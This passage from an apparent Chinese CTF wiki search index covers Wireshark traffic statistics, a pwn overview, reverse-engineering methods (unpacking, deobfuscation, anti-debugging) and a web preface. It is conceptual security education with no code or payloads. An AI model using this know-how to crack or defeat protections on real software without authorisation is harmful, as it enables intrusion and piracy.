History(\u534f\u8bae\u5206\u7ea7)","text":"<p>\u8fd9\u4e2a\u7a97\u53e3\u73b0\u5b9e\u7684\u662f\u6355\u6349\u6587\u4ef6\u5305\u542b\u7684\u6240\u6709\u534f\u8bae\u7684\u6811\u72b6\u5206\u652f</p> <p></p> <p>\u5305\u542b\u7684\u5b57\u6bb5</p> \u540d\u79f0 \u542b\u4e49 Protocol\uff1a \u534f\u8bae\u540d\u79f0 % Packets\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u6570\u76ee\u5728\u6355\u6349\u6587\u4ef6\u6240\u6709\u5305\u6240\u5360\u7684\u6bd4\u4f8b Packets\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5305\u7684\u6570\u76ee Bytes\uff1a \u542b\u6709\u8be5\u534f\u8bae\u7684\u5b57\u8282\u6570 Mbit/s\uff1a \u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd End Packets\uff1a \u8be5\u534f\u8bae\u4e2d\u7684\u5305\u7684\u6570\u76ee\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 End Bytes\uff1a \u8be5\u534f\u8bae\u4e2d\u7684\u5b57\u8282\u6570\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 End Mbit/s\uff1a \u6293\u5305\u65f6\u95f4\u5185\u7684\u534f\u8bae\u5e26\u5bbd\uff08\u4f5c\u4e3a\u6587\u4ef6\u4e2d\u7684\u6700\u9ad8\u534f\u8bae\u5c42\uff09 <p>\u8fd9\u4e00\u529f\u80fd\u53ef\u4ee5\u4e3a\u5206\u6790\u6570\u636e\u5305\u7684\u4e3b\u8981\u65b9\u5411\u63d0\u4f9b\u4f9d\u636e</p>"},{"location":"misc/traffic/protocols/wireshark/#conversation","title":"Conversation(\u5bf9\u8bdd)","text":"<p>\u53d1\u751f\u4e8e\u4e00\u7279\u5b9a\u7aef\u70b9\u7684IP\u95f4\u7684\u6240\u6709\u6d41\u91cf.</p> <p></p> <p>Note</p> <p>\u200b    - \u67e5\u770b\u6536\u53d1\u5927\u91cf\u6570\u636e\u6d41\u7684IP\u5730\u5740\u3002\u5982\u679c\u662f\u4f60\u77e5\u9053\u7684\u670d\u52a1\u5668\uff08\u4f60\u8bb0\u5f97\u670d\u52a1\u5668\u7684\u5730\u5740\u6216\u5730\u5740\u8303\u56f4\uff09\uff0c\u90a3\u95ee\u9898\u5c31\u89e3\u51b3\u4e86\uff1b\u4f46\u4e5f\u6709\u53ef\u80fd\u53ea\u662f\u67d0\u53f0\u8bbe\u5907\u6b63\u5728\u626b\u63cf\u7f51\u7edc\uff0c\u6216\u4ec5\u662f\u4e00\u53f0\u4ea7\u751f\u8fc7\u591a\u6570\u636e\u7684PC\u3002 \u200b    - \u67e5\u770b\u626b\u63cf\u6a21\u5f0f\uff08scan pattern\uff09\u3002\u8fd9\u53ef\u80fd\u662f\u4e00\u6b21\u6b63\u5e38\u7684\u626b\u63cf\uff0c\u5982SNMP\u8f6f\u4ef6\u53d1\u9001ping\u62a5\u6587\u4ee5\u67e5\u627e\u7f51\u7edc\uff0c\u4f46\u901a\u5e38\u626b\u63cf\u90fd\u4e0d\u662f\u597d\u4e8b\u60c5</p>"},{"location":"misc/traffic/protocols/wireshark/#endpoints","title":"EndPoints(\u7aef\u70b9)","text":"<p>\u8fd9\u4e00\u5de5\u5177\u5217\u51fa\u4e86Wireshark\u53d1\u73b0\u7684\u6240\u6709endpoints\u4e0a\u7684\u7edf\u8ba1\u4fe1\u606f</p> <p></p>"},{"location":"misc/traffic/protocols/wireshark/#http","title":"HTTP","text":"<ul> <li>Packet Counter</li> </ul> <p>\u53c2\u8003</p> <ul> <li>http://blog.jobbole.com/73482/</li> <li>http://www.vuln.cn/2103</li> </ul>"},{"location":"misc/traffic/protocols/wireshark/#_4","title":"\u4fe1\u606f\u7edf\u8ba1 \u8fdb\u9636\u7248","text":"<p>\u6839\u636e\u603b\u4f53\u4fe1\u606f\u8fc5\u901f\u628a\u63e1\u6d41\u91cf\u5305\u603b\u4f53\u7279\u5f81,\u641e\u6e05\u695a \u505a\u4ec0\u4e48?</p> <p>TODO</p>"},{"location":"misc/traffic/protocols/wireshark/#_5","title":"Wireshark","text":""},{"location":"pwn/readme/","title":"Pwn Overview","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u6982\u8ff0 pwn \u7684\u4e00\u4e9b\u65b9\u5411\uff0c\u4ee5\u53ca\u601d\u60f3\u3002</p>"},{"location":"pwn/readme/#glibc-pwn","title":"GLIBC Pwn","text":"<p>\u901a\u5e38\u662f\u4e0e linux \u4e0b\u7684\u5185\u5b58\u7ba1\u7406\u6709\u5173\u3002\u5982\u6211\u4eec\u5e38\u8bf4\u7684 house of \u7cfb\u5217\u5185\u5bb9</p>"},{"location":"pwn/readme/#browser-pwn","title":"Browser Pwn","text":"<p>\u4e0e\u6d4f\u89c8\u5668\u76f8\u5173\u7684Pwn</p> <p>https://github.com/Escapingbug/awesome-browser-exploit</p>"},{"location":"pwn/readme/#kernel-pwn","title":"Kernel Pwn","text":""},{"location":"pwn/readme/#windows-kernel","title":"Windows Kernel","text":""},{"location":"pwn/readme/#linux-kernel","title":"Linux Kernel","text":"<p>Linux kernel \u7684\u6f0f\u6d1e\uff0c\u5c31 CTF \u800c\u8a00\uff0c\u591a\u662f LKM \u7684\u6f0f\u6d1e\uff0c\u901a\u8fc7\u8fd9\u4e9b\u6f0f\u6d1e\u8fbe\u5230\u63d0\u6743\u4ee5\u53ca\u83b7\u53d6\u7a33\u5b9a shell \u7b49\u76ee\u7684\u3002</p>"},{"location":"pwn/readme/#todo","title":"TODO","text":"<ul> <li>Need a new document section for english.</li> <li>Look into reccursivly translating into english through google.</li> <li>Get a public work to clean up grammar. </li> </ul>"},{"location":"reverse/readme/","title":"\u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b\u7b80\u4ecb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"reverse/readme/#_2","title":"\u5b9a\u4e49","text":"<p>Reverse engineering, also called back engineering, is the process by which a man-made object is deconstructed to reveal its designs, architecture, or to extract knowledge from the object;       ------  from wikipedia</p> <p>\u8f6f\u4ef6\u4ee3\u7801\u9006\u5411\u4e3b\u8981\u6307\u5bf9\u8f6f\u4ef6\u7684\u7ed3\u6784\uff0c\u6d41\u7a0b\uff0c\u7b97\u6cd5\uff0c\u4ee3\u7801\u7b49\u8fdb\u884c\u9006\u5411\u62c6\u89e3\u548c\u5206\u6790\u3002</p>"},{"location":"reverse/readme/#_3","title":"\u5e94\u7528\u9886\u57df","text":"<p>\u4e3b\u8981\u5e94\u7528\u4e8e\u8f6f\u4ef6\u7ef4\u62a4\uff0c\u8f6f\u4ef6\u7834\u89e3\uff0c\u6f0f\u6d1e\u6316\u6398\uff0c\u6076\u610f\u4ee3\u7801\u5206\u6790\u3002</p>"},{"location":"reverse/readme/#ctf","title":"CTF\u7ade\u8d5b\u4e2d\u7684\u9006\u5411","text":"<p>\u6d89\u53ca Windows\u3001Linux\u3001Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528APK\u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 ------ \u300a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b</p>"},{"location":"reverse/readme/#_4","title":"\u8981\u6c42","text":"<ul> <li>\u719f\u6089\u5982\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6c47\u7f16\u8bed\u8a00\uff0c\u52a0\u89e3\u5bc6\u7b49\u76f8\u5173\u77e5\u8bc6</li> <li>\u5177\u6709\u4e30\u5bcc\u7684\u591a\u79cd\u9ad8\u7ea7\u8bed\u8a00\u7684\u7f16\u7a0b\u7ecf\u9a8c</li> <li>\u719f\u6089\u591a\u79cd\u7f16\u8bd1\u5668\u7684\u7f16\u8bd1\u539f\u7406</li> <li>\u8f83\u5f3a\u7684\u7a0b\u5e8f\u7406\u89e3\u548c\u9006\u5411\u5206\u6790\u80fd\u529b</li> </ul>"},{"location":"reverse/readme/#_5","title":"\u5e38\u89c4\u9006\u5411\u6d41\u7a0b","text":"<ol> <li>\u4f7f\u7528<code>strings/file/binwalk/IDA</code>\u7b49\u9759\u6001\u5206\u6790\u5de5\u5177\u6536\u96c6\u4fe1\u606f\uff0c\u5e76\u6839\u636e\u8fd9\u4e9b\u9759\u6001\u4fe1\u606f\u8fdb\u884c<code>google/github</code>\u641c\u7d22</li> <li>\u7814\u7a76\u7a0b\u5e8f\u7684\u4fdd\u62a4\u65b9\u6cd5\uff0c\u5982\u4ee3\u7801\u6df7\u6dc6\uff0c\u4fdd\u62a4\u58f3\u53ca\u53cd\u8c03\u8bd5\u7b49\u6280\u672f\uff0c\u5e76\u8bbe\u6cd5\u7834\u9664\u6216\u7ed5\u8fc7\u4fdd\u62a4</li> <li>\u53cd\u6c47\u7f16\u76ee\u6807\u8f6f\u4ef6\uff0c\u5feb\u901f\u5b9a\u4f4d\u5230\u5173\u952e\u4ee3\u7801\u8fdb\u884c\u5206\u6790</li> <li>\u7ed3\u5408\u52a8\u6001\u8c03\u8bd5\uff0c\u9a8c\u8bc1\u81ea\u5df1\u7684\u521d\u671f\u731c\u60f3\uff0c\u5728\u5206\u6790\u7684\u8fc7\u7a0b\u4e2d\u7406\u6e05\u7a0b\u5e8f\u529f\u80fd</li> <li>\u9488\u5bf9\u7a0b\u5e8f\u529f\u80fd\uff0c\u5199\u51fa\u5bf9\u5e94\u811a\u672c\uff0c\u6c42\u89e3\u51faflag</li> </ol>"},{"location":"reverse/readme/#tips","title":"\u5b9a\u4f4d\u5173\u952e\u4ee3\u7801tips","text":"<ol> <li> <p>\u5206\u6790\u63a7\u5236\u6d41</p> <p>\u63a7\u5236\u6d41\u53ef\u4ee5\u53c2\u89c1IDA\u751f\u6210\u7684\u63a7\u5236\u6d41\u7a0b\u56fe\uff08CFG\uff09\uff0c\u6cbf\u7740\u5206\u652f\u5faa\u73af\u548c\u51fd\u6570\u8c03\u7528\uff0c\u9010\u5757\u5730\u9605\u8bfb\u53cd\u6c47\u7f16\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u3002</p> </li> <li> <p>\u5229\u7528\u6570\u636e\u3001\u4ee3\u7801\u4ea4\u53c9\u5f15\u7528</p> <p>\u6bd4\u5982\u8f93\u51fa\u7684\u63d0\u793a\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u901a\u8fc7\u6570\u636e\u4ea4\u53c9\u5f15\u7528\u627e\u5230\u5bf9\u5e94\u7684\u8c03\u7528\u4f4d\u7f6e\uff0c\u8fdb\u800c\u627e\u51fa\u5173\u952e\u4ee3\u7801\u3002\u4ee3\u7801\u4ea4\u53c9\u5f15\u7528\u6bd4\u5982\u56fe\u5f62\u754c\u9762\u7a0b\u5e8f\u83b7\u53d6\u7528\u6237\u8f93\u5165\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u5bf9\u5e94\u7684windowsAPI\u51fd\u6570\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u4e9bAPI\u51fd\u6570\u8c03\u7528\u4f4d\u7f6e\u627e\u5230\u5173\u952e\u4ee3\u7801\u3002</p> </li> </ol>"},{"location":"reverse/readme/#tips_1","title":"\u9006\u5411tips","text":"<ol> <li> <p>\u7f16\u7801\u98ce\u683c</p> <p>\u6bcf\u4e2a\u7a0b\u5e8f\u5458\u7684\u7f16\u7801\u98ce\u683c\u90fd\u6709\u6240\u4e0d\u540c\uff0c\u719f\u6089\u5f00\u53d1\u8bbe\u8ba1\u6a21\u5f0f\u7684\u540c\u5b66\u80fd\u66f4\u8fc5\u901f\u5730\u5206\u6790\u51fa\u51fd\u6570\u6a21\u5757\u529f\u80fd</p> </li> <li> <p>\u96c6\u4e2d\u539f\u5219</p> <p>\u7a0b\u5e8f\u5458\u5f00\u53d1\u7a0b\u5e8f\u65f6\uff0c\u5f80\u5f80\u4e60\u60ef\u5c06\u529f\u80fd\u76f8\u5173\u7684\u4ee3\u7801\u6216\u662f\u6570\u636e\u5199\u5728\u540c\u4e00\u4e2a\u5730\u65b9\uff0c\u800c\u5728\u53cd\u6c47\u7f16\u4ee3\u7801\u4e2d\u4e5f\u80fd\u663e\u793a\u51fa\u8fd9\u4e00\u60c5\u51b5\uff0c\u56e0\u6b64\u5728\u5206\u6790\u65f6\u53ef\u4ee5\u67e5\u770b\u5173\u952e\u4ee3\u7801\u9644\u8fd1\u7684\u51fd\u6570\u548c\u6570\u636e\u3002</p> </li> <li> <p>\u4ee3\u7801\u590d\u7528</p> <p>\u4ee3\u7801\u590d\u7528\u60c5\u51b5\u975e\u5e38\u666e\u904d\uff0c\u800c\u6700\u5927\u7684\u6e90\u4ee3\u7801\u4ed3\u5e93Github\u5219\u662f\u6700\u4e3b\u8981\u7684\u6765\u6e90\u3002\u5728\u5206\u6790\u65f6\u53ef\u4ee5\u627e\u4e00\u4e9b\u7279\u5f81\uff08\u5982\u5b57\u7b26\u4e32\uff0c\u4ee3\u7801\u98ce\u683c\u7b49\uff09\u5728Github\u641c\u7d22\uff0c\u53ef\u80fd\u4f1a\u53d1\u73b0\u7c7b\u4f3c\u7684\u4ee3\u7801\uff0c\u5e76\u636e\u6b64\u6062\u590d\u51fa\u5206\u6790\u65f6\u7f3a\u5931\u7684\u7b26\u53f7\u4fe1\u606f\u7b49\u3002</p> </li> <li> <p>\u4e03\u5206\u9006\u5411\u4e09\u5206\u731c</p> <p>\u5408\u7406\u7684\u731c\u6d4b\u5f80\u5f80\u80fd\u4e8b\u534a\u529f\u500d\uff0c\u9047\u5230\u53ef\u7591\u51fd\u6570\u5374\u770b\u4e0d\u6e05\u91cc\u9762\u7684\u903b\u8f91\uff0c\u4e0d\u59a8\u6839\u636e\u5176\u4e2d\u7684\u86db\u4e1d\u9a6c\u8ff9\u731c\u6d4b\u5176\u529f\u80fd\uff0c\u5e76\u4f9d\u636e\u731c\u6d4b\u7ee7\u7eed\u5411\u4e0b\u5206\u6790\uff0c\u5728\u4e0d\u65ad\u7684\u731c\u6d4b\u9a8c\u8bc1\u4e2d\uff0c\u6216\u8bb8\u80fd\u5e2e\u52a9\u4f60\u66f4\u52a0\u63a5\u8fd1\u4ee3\u7801\u7684\u771f\u76f8\u3002</p> </li> <li> <p>\u533a\u5206\u4ee3\u7801</p> <p>\u62ff\u5230\u53cd\u6c47\u7f16\u4ee3\u7801\uff0c\u5fc5\u987b\u80fd\u533a\u5206\u54ea\u4e9b\u4ee3\u7801\u662f\u4eba\u4e3a\u7f16\u5199\u7684\uff0c\u800c\u54ea\u4e9b\u662f\u7f16\u8bd1\u5668\u81ea\u52a8\u9644\u52a0\u7684\u4ee3\u7801\u3002\u4eba\u4e3a\u7f16\u5199\u7684\u4ee3\u7801\u4e2d\uff0c\u53c8\u6709\u54ea\u4e9b\u662f\u5e93\u51fd\u6570\u4ee3\u7801\uff0c\u54ea\u4e9b\u624d\u662f\u51fa\u9898\u4eba\u81ea\u5df1\u5199\u7684\u4ee3\u7801\uff0c\u51fa\u9898\u4eba\u7684\u4ee3\u7801\u53c8\u7ecf\u8fc7\u7f16\u8bd1\u5668\u600e\u6837\u7684\u4f18\u5316\uff1f\u6211\u4eec\u65e0\u987b\u82b1\u8d39\u65f6\u95f4\u5728\u51fa\u9898\u4eba\u4ee5\u5916\u7684\u4ee3\u7801\u4e0a\uff0c\u8fd9\u5f88\u91cd\u8981\u3002\u5982\u679c\u5f53\u4f60\u5206\u6790\u534a\u5929\u8fd8\u5728\u5e93\u51fd\u6570\u91cc\u4e71\u8f6c\uff0c\u90a3\u4e0d\u4ec5\u4f53\u9a8c\u6781\u5dee\uff0c\u4e5f\u6ca1\u6709\u4e1d\u6beb\u6548\u679c\u3002</p> </li> <li> <p>\u8010\u5fc3</p> <p>\u65e0\u8bba\u5982\u4f55\uff0c\u7ed9\u4e88\u8db3\u591f\u7684\u65f6\u95f4\uff0c\u603b\u662f\u80fd\u5c06\u4e00\u4e2a\u7a0b\u5e8f\u5206\u6790\u5730\u900f\u5f7b\u3002\u4f46\u662f\u4e5f\u4e0d\u5e94\u8be5\u8fc7\u65e9\u5730\u653e\u5f03\u5206\u6790\u3002\u76f8\u4fe1\u81ea\u5df1\u80af\u5b9a\u80fd\u5728\u62bd\u8327\u5265\u4e1d\u7684\u8fc7\u7a0b\u4e2d\u7a81\u7834\u95ee\u9898\u3002</p> </li> </ol>"},{"location":"reverse/readme/#_6","title":"\u52a8\u6001\u5206\u6790","text":"<p>\u52a8\u6001\u5206\u6790\u7684\u76ee\u7684\u5728\u4e8e\u5b9a\u4f4d\u5173\u952e\u4ee3\u7801\u540e\uff0c\u5728\u7a0b\u5e8f\u8fd0\u884c\u7684\u8fc7\u7a0b\u4e2d\uff0c\u501f\u7531\u8f93\u51fa\u4fe1\u606f\uff08\u5bc4\u5b58\u5668\uff0c\u5185\u5b58\u53d8\u5316\uff0c\u7a0b\u5e8f\u8f93\u51fa\uff09\u7b49\u6765\u9a8c\u8bc1\u81ea\u5df1\u7684\u63a8\u65ad\u6216\u662f\u7406\u89e3\u7a0b\u5e8f\u529f\u80fd</p> <p>\u4e3b\u8981\u65b9\u6cd5\u6709\uff1a\u8c03\u8bd5\uff0c\u7b26\u53f7\u6267\u884c\uff0c\u6c61\u70b9\u5206\u6790</p>"},{"location":"reverse/readme/#_7","title":"\u7b97\u6cd5\u548c\u6570\u636e\u7ed3\u6784\u8bc6\u522b","text":"<ul> <li>\u5e38\u7528\u7b97\u6cd5\u8bc6\u522b</li> </ul> <p>\u5982<code>Tea/XTea/XXTea/IDEA/RC4/RC5/RC6/AES/DES/IDEA/MD5/SHA256/SHA1</code>\u7b49\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5927\u6570\u52a0\u51cf\u4e58\u9664\u3001\u6700\u77ed\u8def\u7b49\u4f20\u7edf\u7b97\u6cd5</p> <ul> <li>\u5e38\u7528\u6570\u636e\u7ed3\u6784\u8bc6\u522b</li> </ul> <p>\u5982\u56fe\u3001\u6811\u3001\u54c8\u5e0c\u8868\u7b49\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u5728\u6c47\u7f16\u4ee3\u7801\u4e2d\u7684\u8bc6\u522b\u3002</p>"},{"location":"reverse/readme/#_8","title":"\u4ee3\u7801\u6df7\u6dc6","text":"<p>\u6bd4\u5982\u4f7f\u7528<code>OLLVM</code>\uff0c<code>movfuscator</code>\uff0c<code>\u82b1\u6307\u4ee4</code>\uff0c<code>\u865a\u62df\u5316</code>\u53ca<code>SMC</code>\u7b49\u5de5\u5177\u6280\u672f\u5bf9\u4ee3\u7801\u8fdb\u884c\u6df7\u6dc6\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u5206\u6790\u5341\u5206\u56f0\u96be\u3002</p> <p>\u90a3\u4e48\u5bf9\u5e94\u7684\u4e5f\u6709\u53cd\u6df7\u6dc6\u6280\u672f\uff0c\u6700\u4e3b\u8981\u7684\u76ee\u7684\u5c31\u662f\u590d\u539f\u63a7\u5236\u6d41\u3002\u6bd4\u5982<code>\u6a21\u62df\u6267\u884c</code>\u548c<code>\u7b26\u53f7\u6267\u884c</code></p>"},{"location":"reverse/readme/#_9","title":"\u4fdd\u62a4\u58f3","text":"<p>\u4fdd\u62a4\u58f3\u7c7b\u578b\u6709\u8bb8\u591a\uff0c\u7b80\u5355\u7684\u538b\u7f29\u58f3\u53ef\u4ee5\u5f52\u7c7b\u4e3a\u5982\u4e0b\u51e0\u79cd</p> <ul> <li> <p>unpack -&gt; execute</p> <p>\u76f4\u63a5\u5c06\u7a0b\u5e8f\u4ee3\u7801\u5168\u90e8\u89e3\u538b\u5230\u5185\u5b58\u4e2d\u518d\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\u4ee3\u7801</p> </li> <li> <p>unpack -&gt; execute -&gt; unpack -&gt; execute ...</p> <p>\u89e3\u538b\u90e8\u5206\u4ee3\u7801\uff0c\u518d\u8fb9\u89e3\u538b\u8fb9\u6267\u884c</p> </li> <li> <p>unpack -&gt; [decoder | encoded code] -&gt; decode -&gt; execute</p> <p>\u7a0b\u5e8f\u4ee3\u7801\u6709\u8fc7\u7f16\u7801\uff0c\u5728\u89e3\u538b\u540e\u518d\u8fd0\u884c\u51fd\u6570\u5c06\u771f\u6b63\u7684\u7a0b\u5e8f\u4ee3\u7801\u89e3\u7801\u6267\u884c</p> </li> </ul> <p>\u5bf9\u4e8e\u8131\u58f3\u4e5f\u6709\u76f8\u5173\u7684\u65b9\u6cd5\uff0c\u6bd4\u5982<code>\u5355\u6b65\u8c03\u8bd5\u6cd5</code>\uff0c<code>ESP\u5b9a\u5f8b</code>\u7b49\u7b49</p>"},{"location":"reverse/readme/#_10","title":"\u53cd\u8c03\u8bd5","text":"<p>\u53cd\u8c03\u8bd5\u610f\u5728\u901a\u8fc7\u68c0\u6d4b\u8c03\u8bd5\u5668\u7b49\u65b9\u6cd5\u907f\u514d\u7a0b\u5e8f\u88ab\u8c03\u8bd5\u5206\u6790\u3002\u6bd4\u5982\u4f7f\u7528\u4e00\u4e9bAPI\u51fd\u6570\u5982<code>IsDebuggerPresent</code>\u68c0\u6d4b\u8c03\u8bd5\u5668\uff0c\u4f7f\u7528<code>SEH\u5f02\u5e38\u5904\u7406</code>\uff0c\u65f6\u95f4\u5dee\u68c0\u6d4b\u7b49\u65b9\u6cd5\u3002\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8986\u5199\u8c03\u8bd5\u7aef\u53e3\u3001\u81ea\u8c03\u8bd5\u7b49\u65b9\u6cd5\u8fdb\u884c\u4fdd\u62a4\u3002</p>"},{"location":"reverse/readme/#_11","title":"\u975e\u5e38\u89c4\u9006\u5411\u601d\u8def","text":"<p>\u975e\u5e38\u89c4\u9006\u5411\u9898\u8bbe\u8ba1\u7684\u9898\u76ee\u8303\u56f4\u975e\u5e38\u4e4b\u5e7f\uff0c\u53ef\u4ee5\u662f\u4efb\u610f\u67b6\u6784\u7684\u4efb\u610f\u683c\u5f0f\u6587\u4ef6\u3002</p> <ul> <li>lua/python/java/lua-jit/haskell/applescript/js/solidity/webassembly/etc..</li> <li>firmware/raw bin/etc..</li> <li>chip8/avr/clemency/risc-v/etc.</li> </ul> <p>\u4f46\u662f\u9006\u5411\u5de5\u7a0b\u7684\u65b9\u6cd5\u5b66\u91cc\u4e0d\u60e7\u6015\u8fd9\u4e9b\u672a\u77e5\u7684\u5e73\u53f0\u683c\u5f0f\uff0c\u9047\u5230\u8fd9\u6837\u7684\u975e\u5e38\u89c4\u9898\uff0c\u6211\u4eec\u4e5f\u6709\u4e00\u4e9b\u57fa\u672c\u7684\u6d41\u7a0b\u53ef\u4ee5\u901a\u7528</p>"},{"location":"reverse/readme/#_12","title":"\u524d\u671f\u51c6\u5907","text":"<ul> <li>\u9605\u8bfb\u6587\u6863\u3002\u5feb\u901f\u5b66\u4e60\u5e73\u53f0\u8bed\u8a00\u7684\u65b9\u6cd5\u5c31\u662f\u53bb\u9605\u8bfb\u5b98\u65b9\u6587\u6863\u3002</li> <li>\u5b98\u65b9\u5de5\u5177\u3002\u5b98\u65b9\u63d0\u4f9b\u6216\u5efa\u8bae\u7684\u5de5\u5177\u5fc5\u7136\u662f\u6700\u5408\u9002\u7684\u5de5\u5177</li> <li>\u6559\u7a0b\u3002\u5728\u9006\u5411\u65b9\u9762\uff0c\u4e5f\u8bb8\u6709\u8bb8\u591a\u524d\u8f88\u5199\u51fa\u4e86\u4e13\u95e8\u9488\u5bf9\u8be5\u5e73\u53f0\u8bed\u8a00\u7684\u9006\u5411\u6559\u7a0b\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u5feb\u901f\u5438\u6536\u8fd9\u5176\u4e2d\u7684\u77e5\u8bc6\u3002</li> </ul>"},{"location":"reverse/readme/#_13","title":"\u627e\u5de5\u5177","text":"<p>\u4e3b\u8981\u627e<code>\u6587\u4ef6\u89e3\u6790\u5de5\u5177</code>\u3001<code>\u53cd\u6c47\u7f16\u5668</code>\u3001<code>\u8c03\u8bd5\u5668</code>\u548c<code>\u53cd\u7f16\u8bd1\u5668</code>\u3002\u5176\u4e2d<code>\u53cd\u6c47\u7f16\u5668</code>\u662f\u5fc5\u9700\u7684\uff0c<code>\u8c03\u8bd5\u5668</code>\u4e5f\u5305\u542b\u6709\u76f8\u5e94\u7684\u53cd\u6c47\u7f16\u529f\u80fd\uff0c\u800c\u5bf9\u4e8e<code>\u53cd\u7f16\u8bd1\u5668</code>\u5219\u8981\u81ea\u6c42\u591a\u798f\u4e86\uff0c\u5f97\u4e4b\u6211\u5e78\u5931\u4e4b\u6211\u547d\u3002</p> <p>\u627e\u5de5\u5177\u603b\u7ed3\u8d77\u6765\u5c31\u662f\uff1aGoogle\u5927\u6cd5\u597d\u3002\u5408\u7406\u5229\u7528Google\u641c\u7d22\u8bed\u6cd5\uff0c\u8fdb\u884c\u5173\u952e\u5b57\u641c\u7d22\u53ef\u4ee5\u5e2e\u52a9\u4f60\u66f4\u5feb\u66f4\u597d\u5730\u627e\u5230\u5408\u9002\u5de5\u5177\u3002</p>"},{"location":"web/changelog/","title":"Changelog","text":"<p>~\u8fd9\u91cc~\u7528\u4e8e\u8bb0\u5f55\u6587\u6863\u6240\u4f5c\u51fa\u7684\u6dfb\u52a0\u4e0e\u4fee\u6539\uff0c\u65b9\u4fbf\u5927\u5bb6\u77e5\u9053\u5728\u54ea\u6dfb\u52a0\u4e86\u4ec0\u4e48</p> <p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>2021.7.11\uff1a</p> <p>\u65b0\u589eJBOSS\u6f0f\u6d1e\u7684\u6574\u7406\uff0c\u653e\u5728\u6846\u67b6\u6f0f\u6d1e\u7684java\u4e0b</p> <p>\u65b0\u589enodejs\u4e2dunicode\u635f\u574f\u5bfc\u81f4crlf</p>"},{"location":"web/readme/","title":"\u524d\u8a00","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>web\u76f8\u5173\u7684\u6280\u672f\u8d44\u6599\u6709\u5f88\u591a\uff0c\u800c\u4e14\u6211\u4eec\u80fd\u591fgoogle\u5230\u975e\u5e38\u591a\u7684\u59ff\u52bf\u3002\u5982\u4f55\u5c06\u73b0\u6709\u7684\u77e5\u8bc6\u4ee5\u4e00\u6761\u5b8c\u6574\u7684\u94fe\u7ec4\u5408\u8d77\u6765\uff0c\u662f\u6211\u8ba4\u4e3a\u7684web\u7684\u6838\u5fc3\uff0c\u9700\u8981\u575a\u6301\u4e0d\u61c8\u7684\u52aa\u529b\u5f62\u6210\u6bd4\u8f83\u5b8c\u6574\u7684\u6e17\u900f\u4f53\u7cfb\u3002\u540c\u65f6\uff0cweb\u5b83\u53c8\u5f88\u591a\u5f88\u6742\uff0c\u4e0a\u624b\u5e94\u8be5\u662f\u6700\u7b80\u5355\u7684\uff0c\u7ee7\u7eed\u5b66\u4e0b\u53bb\u5982\u679c\u4e0d\u505a\u603b\u7ed3\u7684\u8bdd\u80af\u5b9a\u4f1a\u88ab\u6df9\u6ca1\u3002\u4ee5\u4e0b\u662f\u672c\u4eba\u534a\u5e74\u4ee5\u6765\u7684\u77e5\u8bc6\u70b9\u603b\u7ed3\uff0c\u5e0c\u671b\u80fd\u591f\u5e2e\u52a9\u5927\u5bb6\u7684\u5b66\u4e60\uff0c\u6b22\u8fce\u5404\u4f4dweb\u9009\u624b\u7684\u8865\u5145\u3002\u9274\u4e8e\u672c\u4eba\u80fd\u529b\u6c34\u5e73\u6709\u9650\uff0c\u5982\u53d1\u73b0\u9519\u8bef\u8bf7\u5148\u544a\u77e5\uff0c\u7136\u540e\u4fee\u6539\u3002\u6700\u540e\uff0c\u603b\u7ed3\u53ef\u80fd\u4f1a\u6709\u90e8\u5206\u91cd\u590d\u5185\u5bb9\u653e\u5728\u4e0d\u540c\u7684\u6a21\u5757\u91cc\u9762\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4e2a\u4eba\u5e0c\u671b\u5c3d\u53ef\u80fd\u7684\u5c06\u89e3\u9898\u91cd\u5fc3\u653e\u5728\u601d\u8def\u65b9\u9762\u3002</p> 